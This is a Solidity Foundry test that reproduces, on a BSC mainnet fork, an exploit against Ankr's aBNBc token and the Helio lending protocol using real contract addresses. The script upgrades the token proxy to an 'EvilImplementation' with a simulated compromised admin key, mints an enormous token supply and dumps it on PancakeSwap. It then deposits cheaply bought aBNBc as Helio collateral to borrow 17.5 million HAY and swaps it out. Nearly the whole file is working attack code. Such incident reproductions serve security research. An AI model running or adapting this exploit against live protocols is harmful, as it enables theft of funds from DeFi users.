// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/EvilImplementation.sol";

interface ProxyAdmin {
    function upgrade(address proxy, address implementation) external;
}

interface TransparentUpgradeableProxy {
    function implementation() external returns (address);
}

interface Interaction {
    function borrow(address token, uint256 hayAmount) external;
    function collaterals(address) external returns (address, bytes32, uint32, address);
}

interface Provider {
    function provideInABNBc(uint256 amount) external returns (uint256);
}

interface Spotter {
    function ilks(bytes32) external returns (address, uint256);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract Exploit is Test {
    address public constant ANKR_DEPLOYER = 0x2Ffc59d32A524611Bb891cab759112A51f9e33C0;
    address public constant ANKR_PROXY_ADMIN = 0x1bD5dF997c8612652886723406131F582ab93DEf;
    address public constant ABNBC_PROXY = 0xE85aFCcDaFBE7F2B096f268e31ccE3da8dA2990A;
    address public constant HELIO_INTERACTION = 0xB68443Ee3e828baD1526b3e0Bdf2Dfc6b1975ec4;
    address public constant HELIO_PROVIDER = 0xa835F890Fcde7679e7F7711aBfd515d2A267Ed0B;
    address public constant HELIO_BNB = 0x4b30fcAA7945fE9fDEFD2895aae539ba102Ed6F6;
    address public constant HELIO_HAY = 0x0782b6d8c4551B9760e74c0545a9bCD90bdc41E5;
    address public constant CE_ROUTER = 0xA186D2363E5048D129E0a35E2fddDe767d4dada8;
    address public constant CE_ABNBC = 0x563282106A5B0538f8673c787B3A16D3Cc1DbF1a;
    uint256 public constant EXPLOIT_AMOUNT = 10_000_000_000_000 ether;
    address public ANKR_EXPLOITER;
    address public HELIO_EXPLOITER;
    EvilImplementation public evilImpl;

    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address[] aBNBcToUSDC = [ABNBC_PROXY, WBNB, BUSD, USDC];
    address[] wBNBToaBNBc = [WBNB, ABNBC_PROXY];
    address[] hayToBUSD= [HELIO_HAY, BUSD];
    IPancakePair WBNB_ABNBC_PAIR = IPancakePair(payable(0x272c2CF847A49215A3A1D4bFf8760E503A06f880));
    IPancakeRouter PANCAKE_ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function setUp() public {
        vm.createSelectFork("bsc", 23545400);

        ANKR_EXPLOITER = makeAddr("Ankr Exploiter");
        HELIO_EXPLOITER = makeAddr("Helio Exploiter");
        evilImpl = new EvilImplementation();
    }

    function testExploit() public {
        assertEq(IERC20(ABNBC_PROXY).balanceOf(ANKR_EXPLOITER), 0);

        // simulate compromised Ankr admin deployer private key
        vm.startPrank(ANKR_DEPLOYER);

        // upgrade to evil implementation
        ProxyAdmin(ANKR_PROXY_ADMIN).upgrade(ABNBC_PROXY, address(evilImpl));

        // assert that the proxy implementation is now the evil implementation
        changePrank(ANKR_PROXY_ADMIN);
        assertEq(TransparentUpgradeableProxy(ABNBC_PROXY).implementation(), address(evilImpl));

        // mint tokens to the exploiter
        changePrank(ANKR_DEPLOYER);
        EvilImplementation(ABNBC_PROXY).evilMint(ANKR_EXPLOITER, EXPLOIT_AMOUNT);
        assertEq(IERC20(ABNBC_PROXY).balanceOf(ANKR_EXPLOITER), EXPLOIT_AMOUNT);
        emit log_named_uint("aBNBc minted", EXPLOIT_AMOUNT);

        // log pool reserves before
        (uint256 wBNB, uint256 aBNBc,) = WBNB_ABNBC_PAIR.getReserves();
        emit log_named_uint("wBNB reserves before", wBNB);
        emit log_named_uint("aBNBc reserves before", aBNBc);

        // swap aBNBc for USDC via wBNB and BUSD
        changePrank(ANKR_EXPLOITER);
        IERC20(ABNBC_PROXY).approve(address(PANCAKE_ROUTER), EXPLOIT_AMOUNT);
        (uint256[] memory amounts) = PANCAKE_ROUTER.swapExactTokensForTokens(
            EXPLOIT_AMOUNT, 0, aBNBcToUSDC, ANKR_EXPLOITER, block.timestamp + 500 seconds
        );
        emit log_named_uint("USDC received", amounts[amounts.length - 1]);
        delete amounts;

        // log pool reserves after
        (wBNB, aBNBc,) = WBNB_ABNBC_PAIR.getReserves();
        emit log_named_uint("wBNB reserves after", wBNB);
        emit log_named_uint("aBNBc reserves after", aBNBc);

        // advance time and start Helio exploit
        vm.warp(block.timestamp + 1 hours);
        uint256 wBNBAmount = 10 ether;
        deal(WBNB, HELIO_EXPLOITER, wBNBAmount);

        // buy cheap aBNBc
        changePrank(HELIO_EXPLOITER);
        emit log_named_uint("wBNB spent", wBNBAmount);
        IERC20(WBNB).approve(address(PANCAKE_ROUTER), wBNBAmount);
        (amounts) = PANCAKE_ROUTER.swapExactTokensForTokens(
            wBNBAmount, 0, wBNBToaBNBc, HELIO_EXPLOITER, block.timestamp + 500 seconds
        );
        uint256 aBNBcAmount = amounts[amounts.length - 1];
        emit log_named_uint("aBNBc received", aBNBcAmount);
        delete amounts;

        // query some Helio state
        (, bytes memory result) = HELIO_INTERACTION.call(abi.encodeWithSignature("spotter()"));
        address spotter = abi.decode(result, (address));
        emit log_named_address("spotter address", spotter);
        (, result) = HELIO_INTERACTION.call(abi.encodeWithSignature("collateralRate(address)", CE_ABNBC));
        uint256 collateralRate = abi.decode(result, (uint256));
        emit log_named_uint("collateralRate", collateralRate);
        (, result) = HELIO_INTERACTION.call(abi.encodeWithSignature("collateralPrice(address)", CE_ABNBC));
        emit log_named_uint("collateralPrice", (abi.decode(result, (uint256))));

        (,bytes32 ilk, , ) = Interaction(HELIO_INTERACTION).collaterals(CE_ABNBC);
        emit log_named_bytes32("ilk", ilk);

        (address pip, ) = Spotter(spotter).ilks(ilk);
        emit log_named_address("pip", pip);

        // take out Helio loan & profit
        uint256 hayAmount = 17_500_000 * 1e18;
        IERC20(ABNBC_PROXY).approve(CE_ROUTER, aBNBcAmount);
        Provider(HELIO_PROVIDER).provideInABNBc(aBNBcAmount);
        emit log_named_uint("hBNB received (deposit receipt)", IERC20(HELIO_BNB).balanceOf(HELIO_EXPLOITER));
        Interaction(HELIO_INTERACTION).borrow(CE_ABNBC, hayAmount);

        uint256 hayBalance = IERC20(HELIO_HAY).balanceOf(HELIO_EXPLOITER);
        emit log_named_uint("HAY received", hayBalance);
        IERC20(HELIO_HAY).approve(address(PANCAKE_ROUTER), hayBalance);
        (amounts) = PANCAKE_ROUTER.swapExactTokensForTokens(
            hayBalance, 0, hayToBUSD, HELIO_EXPLOITER, block.timestamp + 500 seconds
        );
        emit log_named_uint("BUSD received", amounts[amounts.length - 1]);
    }
}
